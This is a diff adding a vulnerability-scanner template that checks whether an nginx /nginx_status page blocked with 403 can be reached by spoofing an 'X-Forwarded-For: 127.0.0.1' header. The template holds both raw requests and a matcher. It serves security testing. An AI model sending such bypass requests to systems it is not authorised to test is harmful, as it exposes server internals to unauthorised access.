@@ -1,0 +1,26 @@
+id: nginxstatus_bypass  
+
+info:
+  name: nginxstatus_bypass
+  author: osamahamad
+  severity: low
+  reference: https://galnagli.com/Cache_Poisoning/
+
+requests:
+  - raw:
+      - |
+        GET /nginx_status HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET /nginx_status HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        Accept: */*
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 403 && contains(body_2, "Active connections")'
